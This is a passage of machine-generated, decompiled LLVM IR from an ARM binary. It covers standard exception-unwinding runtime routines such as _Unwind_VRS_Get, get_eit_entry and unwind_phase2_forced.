  uselistorder i32 ()* @__aeabi_read_tp, { 65, 71, 70, 64, 63, 80, 79, 68, 69, 67, 66, 78, 77, 76, 75, 74, 73, 72, 18, 26, 28, 34, 62, 43, 42, 12, 6, 5, 11, 25, 24, 10, 3, 2, 13, 9, 8, 7, 48, 15, 23, 47, 46, 27, 20, 22, 21, 59, 58, 31, 30, 29, 32, 33, 57, 45, 56, 55, 17, 16, 54, 19, 61, 60, 41, 38, 37, 36, 44, 4, 53, 52, 35, 51, 14, 50, 49, 0, 1, 40, 39 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1850c, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_1851c = icmp eq i32 %regclass, 0
  br i1 %v2_1851c, label %dec_label_pc_18524, label %dec_label_pc_18554

dec_label_pc_18524:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_18524
  %v6_18528 = icmp eq i32 %representation, 0
  br i1 %v6_18528, label %dec_label_pc_18538, label %bb8

.thread3:                                         ; preds = %dec_label_pc_18524
  br label %dec_label_pc_18560

bb8:                                              ; preds = %bb
  br label %dec_label_pc_18560

dec_label_pc_18538:                               ; preds = %bb
  %v3_18538 = mul i32 %regno, 4
  %v2_1853c = add i32 %v3_18538, %context
  %v1_18540 = add i32 %v2_1853c, 4
  %v2_18540 = inttoptr i32 %v1_18540 to i32*
  %v3_18540 = load i32, i32* %v2_18540, align 4
  %v2_1854c = bitcast i8* %valuep to i32*
  store i32 %v3_18540, i32* %v2_1854c, align 4
  ret i32 0

dec_label_pc_18554:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_18554
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_18554, %bb9
  %v0_1855c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_1855c)
  br label %dec_label_pc_18560

dec_label_pc_18560:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_18560, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_18568 = icmp eq i32 %regclass, 0
  br i1 %v2_18568, label %dec_label_pc_18570, label %dec_label_pc_185a0

dec_label_pc_18570:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_18570
  %v6_18574 = icmp eq i32 %representation, 0
  br i1 %v6_18574, label %dec_label_pc_18584, label %bb8

.thread3:                                         ; preds = %dec_label_pc_18570
  br label %dec_label_pc_185ac

bb8:                                              ; preds = %bb
  br label %dec_label_pc_185ac

dec_label_pc_18584:                               ; preds = %bb
  %v3_18588 = mul i32 %regno, 4
  %v1_1858c = bitcast i8* %valuep to i32*
  %v2_1858c = load i32, i32* %v1_1858c, align 4
  %v2_18590 = add i32 %v3_18588, %context
  %v2_18598 = add i32 %v2_18590, 4
  %v3_18598 = inttoptr i32 %v2_18598 to i32*
  store i32 %v2_1858c, i32* %v3_18598, align 4
  ret i32 0

dec_label_pc_185a0:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_185a0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_185a0, %bb9
  %v0_185a8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_185a8)
  br label %dec_label_pc_185ac

dec_label_pc_185ac:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_185ac, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_185b4 = add i32 %context, 68
  %v2_185b4 = inttoptr i32 %v1_185b4 to i32*
  %v3_185b4 = load i32, i32* %v2_185b4, align 4
  ret i32 %v3_185b4

; uselistorder directives
  uselistorder i32 68, { 10, 8, 0, 9, 1, 3, 4, 5, 6, 2, 7 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_185c4 = add i32 %exc, 8
  %v2_185c4 = inttoptr i32 %v1_185c4 to i32*
  %v3_185c4 = load i32, i32* %v2_185c4, align 4
  %v2_185c8 = icmp eq i32 %v3_185c4, 0
  br i1 %v2_185c8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_185dc = xor i1 %v2_185c8, true
  call void @__pseudo_cond_branch(i1 %v2_185dc, i32 %v3_185c4)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_185f4 = call i32 @abort()
  ret i32 %v0_185f4
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_18600 = call i32 @abort()
  ret i32 %v0_18600
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_18604 = load i32, i32* @r4, align 4
  store i32 %v3_18604, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r5.global-to-local, align 4
  %v4_18614 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 132) to i32*), align 4
  %v2_18618 = icmp eq i32 %v4_18614, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_18624 = add i32 %return_address, -2
  store i32 %v1_18624, i32* %r4.global-to-local, align 4
  br i1 %v2_18618, label %dec_label_pc_1865c, label %dec_label_pc_1862c

dec_label_pc_1862c:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_18614)
  %v2_1863c = icmp eq i32 %v1_18624, 0
  br i1 %v2_1863c, label %.thread, label %dec_label_pc_1867cthread-pre-split

.thread:                                          ; preds = %dec_label_pc_1862c
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_18644 = load i32, i32* %r6.global-to-local, align 4
  %v3_18644 = add i32 %v2_18644, 16
  %v4_18644 = inttoptr i32 %v3_18644 to i32*
  store i32 0, i32* %v4_18644, align 4
  br label %dec_label_pc_1864c

dec_label_pc_1864c:                               ; preds = %.thread, %.thread10, %dec_label_pc_187f4, %dec_label_pc_187e0, %dec_label_pc_187bc, %dec_label_pc_18794, %dec_label_pc_18694
  %v0_1864c = load i32, i32* %r2.global-to-local, align 4
  %v2_18654 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_18654, i32* @r4, align 4
  ret i32 %v0_1864c

dec_label_pc_1865c:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_18664 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 20) to i32*), align 4
  %v4_18668 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 48) to i32*), align 4
  store i32 %v4_18668, i32* %r2.global-to-local, align 4
  %v2_1866c = sub i32 %v4_18664, %v4_18668
  %v3_18670 = sdiv i32 %v2_1866c, 8
  store i32 %v3_18670, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1867c

dec_label_pc_1867cthread-pre-split:               ; preds = %dec_label_pc_1862c
  %v3_1867c.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1867c

dec_label_pc_1867c:                               ; preds = %dec_label_pc_1867cthread-pre-split, %dec_label_pc_1865c
  %v0_186c0.pre = phi i32 [ %v1_18624, %dec_label_pc_1867cthread-pre-split ], [ %v4_18668, %dec_label_pc_1865c ]
  %v1_18684 = phi i32 [ %v3_1867c.pr, %dec_label_pc_1867cthread-pre-split ], [ %v3_18670, %dec_label_pc_1865c ]
  %v2_18680 = icmp eq i32 %v1_18684, 0
  br i1 %v2_18680, label %dec_label_pc_18694, label %dec_label_pc_186b0.preheader

dec_label_pc_186b0.preheader:                     ; preds = %dec_label_pc_1867c
  %v2_18684 = add i32 %v1_18684, -1
  %v1_186e0 = add i32 %v0_186c0.pre, 8
  br label %dec_label_pc_186b0.outer

dec_label_pc_18694.loopexit:                      ; preds = %dec_label_pc_1870c
  br label %dec_label_pc_18694

dec_label_pc_18694:                               ; preds = %dec_label_pc_18694.loopexit, %dec_label_pc_1867c, %dec_label_pc_187d8
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_1869c = load i32, i32* %r6.global-to-local, align 4
  %v2_1869c = add i32 %v1_1869c, 16
  %v3_1869c = inttoptr i32 %v2_1869c to i32*
  store i32 0, i32* %v3_1869c, align 4
  br label %dec_label_pc_1864c

dec_label_pc_186a4:                               ; preds = %dec_label_pc_18700
  %v3_186a4 = icmp ult i32 %storemerge40, %v0_18704
  br i1 %v3_186a4, label %dec_label_pc_186ac, label %dec_label_pc_1871c

dec_label_pc_186ac:                               ; preds = %dec_label_pc_186a4
  %v1_186ac = add nsw i32 %v3_186b8, 1
  br label %dec_label_pc_186b0.outer

dec_label_pc_186b0.outer:                         ; preds = %dec_label_pc_186ac, %dec_label_pc_186b0.preheader
  %v1_1870c.ph = phi i32 [ %v1_186ac, %dec_label_pc_186ac ], [ 0, %dec_label_pc_186b0.preheader ]
  %v0_186b0.ph = phi i32 [ %v0_186b0, %dec_label_pc_186ac ], [ %v2_18684, %dec_label_pc_186b0.preheader ]
  br label %dec_label_pc_186b0

dec_label_pc_186b0:                               ; preds = %dec_label_pc_186b0.outer, %dec_label_pc_18714
  %v0_186b0 = phi i32 [ %v1_18714, %dec_label_pc_18714 ], [ %v0_186b0.ph, %dec_label_pc_186b0.outer ]
  %v2_186b0 = add i32 %v0_186b0, %v1_1870c.ph
  %tmp = icmp slt i32 %v2_186b0, 0
  %v4_186b4 = zext i1 %tmp to i32
  %v5_186b4 = add i32 %v4_186b4, %v2_186b0
  %v3_186b8 = sdiv i32 %v5_186b4, 2
  %v3_186bc = mul i32 %v3_186b8, 8
  store i32 %v3_186bc, i32* @ip, align 4
  %v2_186c0 = add i32 %v3_186bc, %v0_186c0.pre
  %v3_186c0 = inttoptr i32 %v2_186c0 to i32*
  %v4_186c0 = load i32, i32* %v3_186c0, align 4
  %v1_186c4 = and i32 %v4_186c0, 1073741824
  %v2_186c4 = icmp eq i32 %v1_186c4, 0
  %v2_186c8 = or i32 %v4_186c0, -2147483648
  %tmp79 = bitcast i32 %v4_186c0 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_186cc = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_186c4, i32 %v2_186cc, i32 %v2_186c8
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_186d0 = icmp eq i32 %v2_18684, %v3_186b8
  store i32 %v2_186c0, i32* %r7.global-to-local, align 4
  br i1 %v9_186d0, label %dec_label_pc_18700, label %dec_label_pc_186e0

dec_label_pc_186e0:                               ; preds = %dec_label_pc_186b0
  %v2_186e4 = add i32 %v3_186bc, %v1_186e0
  %v3_186e4 = inttoptr i32 %v2_186e4 to i32*
  %v4_186e4 = load i32, i32* %v3_186e4, align 4
  %v1_186ec = and i32 %v4_186e4, 1073741824
  %v2_186ec = icmp eq i32 %v1_186ec, 0
  %v2_186f0 = or i32 %v4_186e4, -2147483648
  %tmp81 = bitcast i32 %v4_186e4 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_186f4 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_186ec, i32 %v2_186f4, i32 %v2_186f0
  %v1_186f8 = add i32 %v2_186e4, -1
  %v2_186fc = add i32 %storemerge39, %v1_186f8
  br label %dec_label_pc_18700

dec_label_pc_18700:                               ; preds = %dec_label_pc_186b0, %dec_label_pc_186e0
  %storemerge40 = phi i32 [ %v2_186fc, %dec_label_pc_186e0 ], [ -1, %dec_label_pc_186b0 ]
  %v2_18700 = add i32 %storemerge, %v2_186c0
  %v0_18704 = load i32, i32* %r4.global-to-local, align 4
  %v3_18704 = icmp ult i32 %v0_18704, %v2_18700
  br i1 %v3_18704, label %dec_label_pc_1870c, label %dec_label_pc_186a4

dec_label_pc_1870c:                               ; preds = %dec_label_pc_18700
  %v9_1870c = icmp eq i32 %v3_186b8, %v1_1870c.ph
  br i1 %v9_1870c, label %dec_label_pc_18694.loopexit, label %dec_label_pc_18714

dec_label_pc_18714:                               ; preds = %dec_label_pc_1870c
  %v1_18714 = add nsw i32 %v3_186b8, -1
  br label %dec_label_pc_186b0

dec_label_pc_1871c:                               ; preds = %dec_label_pc_186a4
  %v2_1871c = load i32, i32* %v3_186c0, align 4
  %v1_18720 = and i32 %v2_1871c, 1073741824
  %v2_18720 = icmp eq i32 %v1_18720, 0
  %v2_18724 = or i32 %v2_1871c, -2147483648
  %tmp83 = bitcast i32 %v2_1871c to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_18728 = bitcast float %tmp84 to i32
  %v0_1872c = select i1 %v2_18720, i32 %v2_18728, i32 %v2_18724
  %v2_1872c = add i32 %v0_1872c, %v2_186c0
  %v1_18730 = load i32, i32* %r6.global-to-local, align 4
  %v2_18730 = add i32 %v1_18730, 72
  %v3_18730 = inttoptr i32 %v2_18730 to i32*
  store i32 %v2_1872c, i32* %v3_18730, align 4
  %v0_18734 = load i32, i32* %r7.global-to-local, align 4
  %v1_18734 = add i32 %v0_18734, 4
  %v2_18734 = inttoptr i32 %v1_18734 to i32*
  %v3_18734 = load i32, i32* %v2_18734, align 4
  %v7_18738 = icmp eq i32 %v3_18734, 1
  br i1 %v7_18738, label %.thread10, label %dec_label_pc_1874c

.thread10:                                        ; preds = %dec_label_pc_1871c
  %v1_18738 = add i32 %v3_18734, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_18744 = load i32, i32* %r6.global-to-local, align 4
  %v3_18744 = add i32 %v2_18744, 16
  %v4_18744 = inttoptr i32 %v3_18744 to i32*
  store i32 %v1_18738, i32* %v4_18744, align 4
  br label %dec_label_pc_1864c

dec_label_pc_1874c:                               ; preds = %dec_label_pc_1871c
  %v1_1874c = icmp slt i32 %v3_18734, 0
  br i1 %v1_1874c, label %.thread38, label %dec_label_pc_18764

.thread38:                                        ; preds = %dec_label_pc_1874c
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_18758 = load i32, i32* %r6.global-to-local, align 4
  %v5_18758 = add i32 %v4_18758, 76
  %v6_18758 = inttoptr i32 %v5_18758 to i32*
  store i32 %v1_18734, i32* %v6_18758, align 4
  %v3_1875c = load i32, i32* %r2.global-to-local, align 4
  %v4_1875c = load i32, i32* %r6.global-to-local, align 4
  %v5_1875c = add i32 %v4_1875c, 80
  %v6_1875c = inttoptr i32 %v5_1875c to i32*
  store i32 %v3_1875c, i32* %v6_1875c, align 4
  br label %dec_label_pc_18784

dec_label_pc_18764:                               ; preds = %dec_label_pc_1874c
  %v1_18764 = and i32 %v3_18734, 1073741824
  %v2_18764 = icmp eq i32 %v1_18764, 0
  %v2_18768 = or i32 %v3_18734, -2147483648
  %tmp85 = bitcast i32 %v3_18734 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_1876c = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_18764, i32 %v2_1876c, i32 %v2_18768
  %v1_18770 = add i32 %storemerge42, 4
  %v2_18774 = add i32 %v1_18770, %v0_18734
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1877c = load i32, i32* %r6.global-to-local, align 4
  %v2_1877c = add i32 %v1_1877c, 76
  %v3_1877c = inttoptr i32 %v2_1877c to i32*
  store i32 %v2_18774, i32* %v3_1877c, align 4
  %v0_18780 = load i32, i32* %r2.global-to-local, align 4
  %v1_18780 = load i32, i32* %r6.global-to-local, align 4
  %v2_18780 = add i32 %v1_18780, 80
  %v3_18780 = inttoptr i32 %v2_18780 to i32*
  store i32 %v0_18780, i32* %v3_18780, align 4
  br label %dec_label_pc_18784

dec_label_pc_18784:                               ; preds = %.thread38, %dec_label_pc_18764
  %v0_18784 = load i32, i32* %r6.global-to-local, align 4
  %v1_18784 = add i32 %v0_18784, 76
  %v2_18784 = inttoptr i32 %v1_18784 to i32*
  %v3_18784 = load i32, i32* %v2_18784, align 4
  store i32 %v3_18784, i32* %r2.global-to-local, align 4
  %v1_18788 = inttoptr i32 %v3_18784 to i32*
  %v2_18788 = load i32, i32* %v1_18788, align 4
  %v1_1878c = icmp slt i32 %v2_18788, 0
  br i1 %v1_1878c, label %dec_label_pc_187b0, label %dec_label_pc_18794

dec_label_pc_18794:                               ; preds = %dec_label_pc_18784
  %v1_18794 = and i32 %v2_18788, 1073741824
  %v2_18794 = icmp eq i32 %v1_18794, 0
  %v2_18798 = or i32 %v2_18788, -2147483648
  %tmp87 = bitcast i32 %v2_18788 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_1879c = bitcast float %tmp88 to i32
  %v0_187a0 = select i1 %v2_18794, i32 %v2_1879c, i32 %v2_18798
  %v2_187a0 = add i32 %v0_187a0, %v3_18784
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_187a8 = add i32 %v0_18784, 16
  %v3_187a8 = inttoptr i32 %v2_187a8 to i32*
  store i32 %v2_187a0, i32* %v3_187a8, align 4
  br label %dec_label_pc_1864c

dec_label_pc_187b0:                               ; preds = %dec_label_pc_18784
  %v3_187b0 = udiv i32 %v2_18788, 16777216
  %v1_187b4 = urem i32 %v3_187b0, 16
  %v2_187b4 = icmp eq i32 %v1_187b4, 0
  br i1 %v2_187b4, label %dec_label_pc_187bc, label %dec_label_pc_187d0

dec_label_pc_187bc:                               ; preds = %dec_label_pc_187b0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_187c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_187c4 = add i32 %v0_187c4, -36916
  %v2_187c8 = add i32 %v0_18784, 16
  %v3_187c8 = inttoptr i32 %v2_187c8 to i32*
  store i32 %v2_187c4, i32* %v3_187c8, align 4
  br label %dec_label_pc_1864c

dec_label_pc_187d0:                               ; preds = %dec_label_pc_187b0
  %v7_187d0 = icmp eq i32 %v1_187b4, 1
  br i1 %v7_187d0, label %dec_label_pc_187f4, label %dec_label_pc_187d8

dec_label_pc_187d8:                               ; preds = %dec_label_pc_187d0
  %v7_187d8 = icmp eq i32 %v1_187b4, 2
  br i1 %v7_187d8, label %dec_label_pc_187e0, label %dec_label_pc_18694

dec_label_pc_187e0:                               ; preds = %dec_label_pc_187d8
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_187e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_187e8 = add i32 %v0_187e8, -36932
  %v2_187ec = add i32 %v0_18784, 16
  %v3_187ec = inttoptr i32 %v2_187ec to i32*
  store i32 %v2_187e8, i32* %v3_187ec, align 4
  br label %dec_label_pc_1864c

dec_label_pc_187f4:                               ; preds = %dec_label_pc_187d0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_187fc = load i32, i32* %r5.global-to-local, align 4
  %v2_187fc = add i32 %v0_187fc, -36924
  %v2_18800 = add i32 %v0_18784, 16
  %v3_18800 = inttoptr i32 %v2_18800 to i32*
  store i32 %v2_187fc, i32* %v3_18800, align 4
  br label %dec_label_pc_1864c

; uselistorder directives
  uselistorder i32 %v1_187b4, { 2, 1, 0 }
  uselistorder i32 %v0_18784, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_18734, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_18704, { 1, 0 }
  uselistorder i32 %v3_186bc, { 2, 1, 0 }
  uselistorder i32 %v3_186b8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_186b0, { 1, 0 }
  uselistorder i32 %v0_186b0, { 1, 0 }
  uselistorder i32 %v2_18684, { 1, 0 }
  uselistorder i32 %v0_186c0.pre, { 1, 0 }
  uselistorder i32 %v3_18670, { 1, 0 }
  uselistorder i32 %v1_18624, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_18784, { 1, 0 }
  uselistorder label %dec_label_pc_18700, { 1, 0 }
  uselistorder label %dec_label_pc_186b0, { 1, 0 }
  uselistorder label %dec_label_pc_18694, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1864c, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_1880c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1880c:
  %v0_1880c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1880c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1880c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1880c, %bb
  %v10_18814 = phi i32 [ %arg1, %dec_label_pc_1880c ], [ 0, %bb ]
  ret i32 %v10_18814

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_18828 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_1883c = inttoptr i32 %v1_18828 to i32*
  %v2_1883c = load i32, i32* %v1_1883c, align 4
  store i32 %v2_1883c, i32* %r0.global-to-local, align 4
  %v12_1883c = add i32 %entry_vrs, 20
  %v1_18848 = inttoptr i32 %v12_1883c to i32*
  %v2_18848 = load i32, i32* %v1_18848, align 4
  store i32 %v2_18848, i32* %r0.global-to-local, align 4
  %v12_18848 = add i32 %entry_vrs, 36
  %v1_18850 = inttoptr i32 %v12_18848 to i32*
  %v2_18850 = load i32, i32* %v1_18850, align 4
  store i32 %v2_18850, i32* %r0.global-to-local, align 4
  %v12_18850 = add i32 %entry_vrs, 52
  store i32 %v12_18850, i32* @ip, align 4
  %v13_18854 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_18854, i32* @lr, align 4
  %v1_18858 = inttoptr i32 %v12_18850 to i32*
  %v2_18858 = load i32, i32* %v1_18858, align 4
  store i32 %v2_18858, i32* %r0.global-to-local, align 4
  %v9_18858 = add i32 %entry_vrs, 64
  %v10_18858 = inttoptr i32 %v9_18858 to i32*
  %v11_18858 = load i32, i32* %v10_18858, align 4
  store i32 0, i32* @r4, align 4
  %v1_18860 = add i32 %ucbp, 12
  %v2_18860 = inttoptr i32 %v1_18860 to i32*
  %v3_18860 = load i32, i32* %v2_18860, align 4
  store i32 %v2_18858, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_18878 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_18858)
  store i32 %v2_18878, i32* %r0.global-to-local, align 4
  %v0_1887c = load i32, i32* @r6, align 4
  %v1_1887c = load i32, i32* @r4, align 4
  %v9_1887c = icmp eq i32 %v0_1887c, %v1_1887c
  store i32 %v2_18878, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_1887c, label %dec_label_pc_18890, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_1889c

dec_label_pc_18890:                               ; preds = %entry
  store i32 %v0_1887c, i32* @r4, align 4
  br label %dec_label_pc_18898

dec_label_pc_18898:                               ; preds = %dec_label_pc_18960, %dec_label_pc_18890
  br label %dec_label_pc_1889c

dec_label_pc_1889c:                               ; preds = %.thread, %dec_label_pc_18898
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_18898 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_1889c = icmp eq i32 %v2_18878, 0
  br i1 %v2_1889c, label %dec_label_pc_18914, label %.thread2.dec_label_pc_188b0_crit_edge

.thread2.dec_label_pc_188b0_crit_edge:            ; preds = %dec_label_pc_1889c
  br label %dec_label_pc_188b0

dec_label_pc_188b0:                               ; preds = %.thread2.dec_label_pc_188b0_crit_edge, %dec_label_pc_18914
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_188c0 = load i32, i32* @r5, align 4
  store i32 %v0_188c0, i32* @r3, align 4
  store i32 100560, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_18860)
  br i1 false, label %dec_label_pc_188d8, label %dec_label_pc_18900

dec_label_pc_188d8:                               ; preds = %dec_label_pc_188b0
  br i1 undef, label %dec_label_pc_188e0, label %dec_label_pc_18904

dec_label_pc_188e0:                               ; preds = %dec_label_pc_188d8
  br i1 undef, label %dec_label_pc_18960, label %dec_label_pc_188f8

dec_label_pc_188f8:                               ; preds = %dec_label_pc_188e0
  br i1 undef, label %dec_label_pc_18958, label %dec_label_pc_18900

dec_label_pc_18900:                               ; preds = %dec_label_pc_188b0, %dec_label_pc_188f8
  br label %dec_label_pc_18904

dec_label_pc_18904:                               ; preds = %dec_label_pc_188d8, %dec_label_pc_18900
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_18914:                               ; preds = %dec_label_pc_1889c
  store i32 %v11_18858, i32* @r3, align 4
  %v2_18918 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_18918, i32* @r4, align 4
  %v1_1891c = load i32, i32* @r5, align 4
  %v2_1891c = add i32 %v1_1891c, 20
  %v3_1891c = inttoptr i32 %v2_1891c to i32*
  store i32 %v11_18858, i32* %v3_1891c, align 4
  store i32 %v2_18918, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_1892c = call i32 @memcpy()
  %v0_18934 = load i32, i32* @r6, align 4
  store i32 %v0_18934, i32* %r0.global-to-local, align 4
  %v0_18938 = load i32, i32* @r5, align 4
  %v1_1893c = add i32 %v0_18938, 16
  %v2_1893c = inttoptr i32 %v1_1893c to i32*
  %v3_1893c = load i32, i32* %v2_1893c, align 4
  store i32 %v3_1893c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_1893c)
  %v0_1894c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1894c, i32* @r4, align 4
  br label %dec_label_pc_188b0

dec_label_pc_18958:                               ; preds = %dec_label_pc_188f8
  br label %dec_label_pc_18960

dec_label_pc_18960:                               ; preds = %dec_label_pc_188e0, %dec_label_pc_18958
  br label %dec_label_pc_18898

; uselistorder directives
  uselistorder i32 %v11_18858, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 6, 5, 1, 0, 4, 3, 8, 7 }
  uselistorder i32* @r3, { 107, 108, 40, 41, 29, 109, 110, 32, 111, 112, 3, 113, 114, 115, 4, 116, 117, 118, 5, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 0, 137, 138, 139, 140, 30, 31, 33, 34, 35, 36, 37, 38, 39, 91, 65, 66, 67, 141, 142, 155, 156, 157, 145, 146, 147, 148, 149, 1, 150, 6, 43, 44, 143, 144, 56, 57, 104, 105, 106, 101, 102, 97, 98, 100, 99, 9, 10, 11, 161, 158, 159, 160, 2, 162, 163, 164, 42, 68, 45, 46, 47, 48, 49, 50, 151, 152, 153, 154, 58, 59, 60, 75, 76, 77, 78, 69, 70, 71, 8, 79, 80, 81, 82, 83, 24, 25, 26, 27, 12, 18, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 28, 51, 52, 53, 103, 54, 55, 61, 62, 63, 64, 72, 7, 73, 74, 84, 85, 86, 87, 88, 89, 90, 92, 93, 94, 95, 96 }
  uselistorder i32 10, { 4, 5, 29, 30, 31, 8, 43, 42, 75, 0, 39, 40, 74, 44, 45, 1, 10, 33, 34, 28, 11, 27, 12, 13, 14, 24, 6, 35, 25, 15, 3, 26, 36, 16, 37, 38, 32, 17, 18, 19, 41, 9, 46, 47, 2, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 20, 59, 60, 61, 21, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 7, 72, 22, 73, 23 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_18960, { 1, 0 }
  uselistorder label %dec_label_pc_18904, { 1, 0 }
  uselistorder label %dec_label_pc_18900, { 1, 0 }
